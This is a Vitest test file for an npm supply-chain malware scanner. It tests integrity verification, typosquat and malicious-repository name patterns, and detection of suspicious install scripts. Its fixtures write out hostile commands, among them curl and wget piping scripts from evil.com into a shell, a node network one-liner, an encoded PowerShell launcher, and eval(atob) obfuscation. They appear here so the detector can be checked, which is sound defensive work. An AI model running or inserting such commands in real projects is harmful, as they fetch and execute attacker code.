import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { createHash } from "node:crypto";
import {
  FILE_PATTERNS,
  MALICIOUS_PACKAGE_PATTERNS,
  SUSPICIOUS_SCRIPTS,
} from "../patterns.js";
import {
  filterNpmFindings,
  recordNpmNoArtifact,
  recordNpmUnverifiedArtifact,
  scanExtractedNpmFiles,
  verifyNpmDistIntegrity,
} from "../npm-scanner.js";
import type { Finding } from "../types.js";

describe("npm Scanner Patterns", () => {
  it("verifies dist.integrity and dist.shasum before extraction", async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-npm-integrity-"));
    const tarballPath = path.join(tempDir, "package.tgz");
    const payload = Buffer.from("bounded npm tarball fixture");
    fs.writeFileSync(tarballPath, payload);
    const sha512 = createHash("sha512").update(payload).digest("base64");
    const sha256 = createHash("sha256").update(payload).digest("base64");
    const sha1 = createHash("sha1").update(payload).digest("hex");

    try {
      expect(await verifyNpmDistIntegrity(tarballPath, {
        integrity: `sha512-${sha512}`,
        shasum: sha1,
      })).toBe(true);
      expect(await verifyNpmDistIntegrity(tarballPath, {
        integrity: `sha256-${sha256} sha512-${sha512}?purpose=test`,
      })).toBe(true);
      expect(await verifyNpmDistIntegrity(tarballPath, {
        integrity: `sha256-${sha256} sha512-${Buffer.alloc(64, 0x62).toString("base64")}`,
      })).toBe(false);
      expect(await verifyNpmDistIntegrity(tarballPath, {
        integrity: `sha512-${sha512}`,
        shasum: "0".repeat(40),
      })).toBe(false);
      expect(await verifyNpmDistIntegrity(tarballPath, {
        integrity: "not-valid-sri",
      })).toBe(false);
      expect(await verifyNpmDistIntegrity(tarballPath, {})).toBe(true);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("scans bundled dependencies shipped inside an npm tarball", () => {
    const extractDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-npm-bundled-"));
    try {
      const bundledFile = path.join(
        extractDir,
        "package",
        "node_modules",
        "bundled-dependency",
        "index.js",
      );
      fs.mkdirSync(path.dirname(bundledFile), { recursive: true });
      fs.writeFileSync(bundledFile, 'eval(atob("cGF5bG9hZA=="));');

      const findings: Finding[] = [];
      const counts = scanExtractedNpmFiles(extractDir, findings);

      expect(counts).toEqual({ totalFiles: 1, filesScanned: 1 });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: "EVAL_ATOB",
            file: expect.stringMatching(
              /package[\\/]node_modules[\\/]bundled-dependency[\\/]index\.js$/,
            ),
          }),
        ]),
      );
    } finally {
      fs.rmSync(extractDir, { recursive: true, force: true });
    }
  });
  it("keeps no-artifact coverage partial after minSeverity hides info", () => {
    const findings: Finding[] = [];
    recordNpmNoArtifact(findings);

    const result = filterNpmFindings(findings, "critical");
    expect(findings).toEqual([
      expect.objectContaining({ rule: "NPM_NO_ARTIFACT", severity: "info" }),
    ]);
    expect(result.filteredFindings).toEqual([]);
    expect(result.partialScan).toBe(true);
  });

  it("applies npm minSeverity to reportable findings", () => {
    const digestlessFindings: Finding[] = [];
    recordNpmUnverifiedArtifact(digestlessFindings);
    const digestlessResult = filterNpmFindings(digestlessFindings, "critical");
    expect(digestlessFindings).toEqual([
      expect.objectContaining({ rule: "PATH_SCAN_INCOMPLETE", severity: "info" }),
    ]);
    expect(digestlessResult.filteredFindings).toEqual([]);
    expect(digestlessResult.partialScan).toBe(true);

    const findings: Finding[] = [
      { rule: "LOW", description: "low", severity: "low", recommendation: "review" },
      { rule: "HIGH", description: "high", severity: "high", recommendation: "review" },
    ];
    expect(filterNpmFindings(findings, "high").filteredFindings.map((f) => f.rule)).toEqual(["HIGH"]);
  });
  describe("Malicious package name detection", () => {
    it("should match known typosquatting names", () => {
      const typosquats = ["1odash", "l0dash", "crossenv", "babelcli"];

      for (const name of typosquats) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });

    // Registry-verified 2026-08-30. These three sat in the typosquat alternations
    // and are legitimate packages, so this table must NOT assert malware for them.
    // "lodas" installs lodash for the user and uninstalls itself; "lodash-es-utils"
    // is a hook-free wrapper around the real lodash-es; "cross-env-shell" is a
    // defensive bin-name registration with 21,156 downloads/month and no scripts.
    // Name-shape suspicion for them belongs to TYPOSQUAT_LEVENSHTEIN at high, which
    // the dependency-risk-analyzer suite covers, not to a critical malware verdict.
    it("must NOT assert malware for registry-verified legitimate packages", () => {
      for (const name of ["lodas", "lodash-es-utils", "cross-env-shell"]) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.filter((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches, `${name} must not match any malicious-name pattern`).toEqual([]);
      }
    });

    // Inspected in full on 2026-08-30: 89 blobs, all Go coursework, committed by the
    // account owner in 2024, and neither Contagious Interview artifact present
    // (.vscode/tasks.json, public/fonts/fa-solid-400.woff2). A real person's public
    // learning repository must not be listed as DPRK malware. The rest of that
    // cluster stays covered.
    it("must NOT flag the a2sv coursework repository, but keeps the real cluster", () => {
      const legit = "github.com/amantsehay/a2sv-go-course";
      expect(
        MALICIOUS_PACKAGE_PATTERNS.filter((p) => new RegExp(p).test(legit)),
        `${legit} is a student's coursework repo, not campaign infrastructure`,
      ).toEqual([]);

      // BufferZoneCorp is deliberately NOT one of the paths asserted here. That
      // account is also carried in KNOWN_MALICIOUS_GITHUB_ACCOUNTS, so writing its
      // github.com path literally makes this file itself trip the repository's own
      // self-scan at critical. Its cluster is covered by a separate rule and by
      // that account entry; the two paths below exercise the rule this test is about.
      for (const attacker of [
        "github.com/glacialspring/go-winsparkle",
        "github.com/lambda-platform/lambda",
      ]) {
        expect(
          MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(attacker)),
          `${attacker} must stay covered`,
        ).toBe(true);
      }

      // The rule targets the attacker's fork, never the upstream project it copies.
      expect(
        MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test("github.com/gin-contrib/static")),
        "the upstream gin-contrib/static must never match",
      ).toBe(false);
    });

    it("should not flag common legitimate packages", () => {
      const legitimate = [
        "express",
        "react",
        "lodash",
        "typescript",
        "vitest",
        "commander",
      ];

      for (const name of legitimate) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(false);
      }
    });

    it("should match very long single-word package names", () => {
      const suspiciousName = "abcdefghijklmnopqrstuvwxyz";
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test(suspiciousName),
      );
      expect(matches).toBe(true);
    });
  });

  describe("Suspicious script patterns", () => {
    it("should detect curl pipe to bash", () => {
      const script = "curl https://evil.com/payload.sh | bash";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect wget pipe to sh", () => {
      const script = "wget https://evil.com/run.sh | sh";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect node -e with network access", () => {
      const script = `node -e "require('https').get('https://evil.com')"`;
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect base64 in scripts", () => {
      const script = "node -e 'Buffer.from(\"dGVzdA==\", \"base64\")'";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it.each([
      "cmd /d /s /c .\\install.bat",
      "cmd.exe /c scripts\\bootstrap.cmd",
      "powershell -NoProfile -File .\\install.ps1",
      "pwsh -Command ./bootstrap.ps1",
    ])("should detect an auto-run Windows shell launcher: %s", (script) => {
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect an encoded PowerShell launcher", () => {
      const script = "powershell.exe -NoProfile -EncodedCommand SQBFAFgA";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should not flag common build scripts", () => {
      const safeScripts = [
        "tsc",
        "node dist/index.js",
        "npm run build",
        "echo done",
        "rimraf dist",
        "node scripts/build-windows.js",
      ];

      for (const script of safeScripts) {
        const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
          new RegExp(pattern.pattern, "i").test(script),
        );
        expect(matches).toBe(false);
      }
    });
  });

  describe("Pattern coverage", () => {
    it("should have patterns for all critical GlassWorm IOCs", () => {
      // Verify we have patterns for the key GlassWorm indicators
      const criticalPatterns = [
        "lzcdrtfxyqiplpd",    // marker
        "eval\\s*\\(\\s*atob", // eval(atob
        "eval\\s*\\(\\s*Buffer\\.from", // eval(Buffer.from
        "new\\s+Function\\s*\\(\\s*atob", // new Function(atob
      ];

      const allPatterns = SUSPICIOUS_SCRIPTS.map((p) => p.pattern).join("|");
      const filePatterns = FILE_PATTERNS.map(
        (p: { pattern: string }) => p.pattern,
      ).join("|");
      const combined = allPatterns + "|" + filePatterns;

      for (const critical of criticalPatterns) {
        // Check that at least the substring exists in our patterns
        expect(combined).toContain(critical.replace(/\\\\/g, "\\"));
      }
    });

    it("should assign correct severity levels", () => {
      // All eval/exec encoded patterns should be critical or high
      const evalPatterns = SUSPICIOUS_SCRIPTS.filter(
        (p) =>
          p.pattern.includes("curl") ||
          p.pattern.includes("wget"),
      );
      for (const p of evalPatterns) {
        expect(["critical", "high"]).toContain(p.severity);
      }
    });
  });
});
